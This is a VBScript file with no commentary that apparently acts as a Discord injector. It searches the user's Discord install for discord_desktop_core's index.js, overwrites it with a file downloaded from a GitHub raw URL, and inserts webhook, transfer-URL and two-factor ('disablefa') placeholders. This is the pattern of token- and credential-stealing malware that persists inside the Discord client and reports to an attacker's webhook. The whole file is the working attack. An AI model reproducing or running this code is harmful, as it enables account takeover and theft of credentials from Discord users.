Dim objFSO, objFolder, objSubFolder, obModule, objDesktopParent, objDesktop, objFile, outputFilePath, regexApp, regexModule, regexDesktop, regexIndex, matchApp, matchModule, matchDesktop, matchIndex, username

username = CreateObject("WScript.Network").UserName
Dim parentFolderPath
parentFolderPath = "C:\Users\" & username & "\AppData\Local\Discord\"
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set regexApp = New RegExp
regexApp.Pattern = "app-"
Set regexModule = New RegExp
regexModule.Pattern = "modules"
Set regexDesktop = New RegExp
regexDesktop.Pattern = "discord_desktop_core-(\d+)"
Set regexIndex = New RegExp
regexIndex.Pattern = "index\.js"
outputFilePath = "Output.txt"
Set outputTextStream = objFSO.CreateTextFile(outputFilePath, True)
Set objFolder = objFSO.GetFolder(parentFolderPath)
For Each objSubFolder In objFolder.SubFolders
    Set matchApp = regexApp.Execute(objSubFolder.Name)
    If matchApp.Count > 0 Then
        For Each obModule In objSubFolder.SubFolders
            Set matchModule = regexModule.Execute(obModule.Name)
            If matchModule.Count > 0 Then
                For Each objDesktopParent In obModule.SubFolders
                    Set matchDesktop = regexDesktop.Execute(objDesktopParent.Name)
                    If matchDesktop.Count > 0 Then
                        For Each objDesktop In objDesktopParent.SubFolders
                            For Each objFile In objDesktop.Files
                                Set matchIndex = regexIndex.Execute(objFile.Name)
                                If matchIndex.Count > 0 Then
                                    filePath = objFile.Path
                                    Dim your_url, your_file, webhook, transferurl, disablefa
                                    your_url = "https://raw.githubusercontent.com/KSCH-58/sub/main/index.js"
                                    your_file = filePath
                                    webhook = "your_webhook_value"
                                    transferurl = "your_transfer_url_value"
                                    disablefa = "your_disablefa_value"
                                    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
                                    objXMLHTTP.open "GET", your_url, False
                                    objXMLHTTP.send()
                                    If objXMLHTTP.Status = 200 Then
                                        Set objADOStream = CreateObject("ADODB.Stream")
                                        objADOStream.Open
                                        objADOStream.Type = 1
                                        objADOStream.Write objXMLHTTP.ResponseBody
                                        objADOStream.Position = 0
                                        Set objFSO = Createobject("Scripting.FileSystemObject")
                                        If objFSO.Fileexists(your_file) Then objFSO.DeleteFile your_file
                                        objADOStream.SaveToFile your_file
                                        objADOStream.Close
                                        Set objADOStream = Nothing
                                        If objFSO.Fileexists(your_file) Then
                                            Set objTextFile = objFSO.OpenTextFile(your_file, 1)
                                            fileContent = objTextFile.ReadAll
                                            objTextFile.Close
                                            fileContent = Replace(fileContent, "%WEBHOOK%", webhook)
                                            fileContent = Replace(fileContent, "%TRANSFER_URL%", transferurl)
                                            fileContent = Replace(fileContent, "%DISABLEFA%", disablefa)
                                            Set objTextFile = objFSO.OpenTextFile(your_file, 2)
                                            objTextFile.Write fileContent
                                            objTextFile.Close
                                        End If
                                    End if
                                    Set objXMLHTTP = Nothing
                                    Set objFSO = Nothing
                                End If
                            Next
                        Next
                    End If
                Next
            End If
        Next
    End If
Next
outputTextStream.Close
Set objFSO = Nothing
Set objFolder = Nothing
Set objSubFolder = Nothing
Set obModule = Nothing
Set objDesktopParent = Nothing
Set objDesktop = Nothing
Set objFile = Nothing
Set regexApp = Nothing
Set regexModule = Nothing
Set regexDesktop = Nothing
Set regexIndex = Nothing
Set matchApp = Nothing
Set matchModule = Nothing
Set matchDesktop = Nothing
Set matchIndex = Nothing
